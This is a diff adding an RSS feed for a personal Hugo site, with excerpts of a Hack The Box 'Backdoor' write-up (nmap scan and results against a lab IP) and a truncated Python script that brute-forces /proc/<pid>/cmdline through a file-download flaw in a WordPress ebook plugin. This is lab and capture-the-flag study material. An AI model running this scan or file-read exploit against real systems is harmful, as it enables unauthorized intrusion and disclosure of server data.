@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Swaipy</title>
+    <link>http://localhost:1313/</link>
+    <description>Recent content on Swaipy</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Tue, 14 Mar 2023 18:56:04 -0300</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>(HTB) Backdoor</title>
+      <link>http://localhost:1313/posts/backdoor1/</link>
+      <pubDate>Tue, 14 Mar 2023 18:56:04 -0300</pubDate>
+      
+      <guid>http://localhost:1313/posts/backdoor1/</guid>
+      <description>(HTB) Backdoor Website Enumeration export ip=10.10.11.125
+First nmap scan.
+sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $ip -oG ports
+Results:
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b4de43384657db4c213b69f3db3c6288 (RSA) | 256 aac9fc210f3ef4ec6b3570262253ef66 (ECDSA) |_ 256 d28be4ec0761aacaf8ec1cf88cc1f6e1 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Backdoor &amp;amp;#8211; Real-Life |_http-generator: WordPress 5.8.1 1337/tcp open waste?</description>
+    </item>
+    
+    <item>
+      <title>Backdoor script</title>
+      <link>http://localhost:1313/scripts/backdoorscript/</link>
+      <pubDate>Mon, 15 Mar 2021 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/scripts/backdoorscript/</guid>
+      <description>Backdoor script #!/usr/bin/python3 from pwn import * import requests, signal, time, sys, pdb def def_handler(sig, frame): print(&amp;#34;\n exit&amp;#34;) sys.exit(1) #def makeRequest(): # Ctrl+C signal.signal(signal.SIGINT, def_handler) # variables main_url = &amp;#34;http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=&amp;#34; def makeRequest(): p1 = log.progress(&amp;#34;Brute Force Attack&amp;#34;) p1.status(&amp;#34;Starting brute force attack&amp;#34;) time.sleep(2) for i in range(1, 1000): p1.status(&amp;#34;trying with PATH /proc/%s/cmdline&amp;#34; % str(i)) url = main_url + &amp;#34;/proc/&amp;#34; + str(i) + &amp;#34;/cmdline&amp;#34; #print(url) r = requests.get(url) if len(r.content) &amp;gt; 82: print(&amp;#34;======================&amp;#34;) log.</description>
+    </item>
+    
+  </channel>
+</rss>
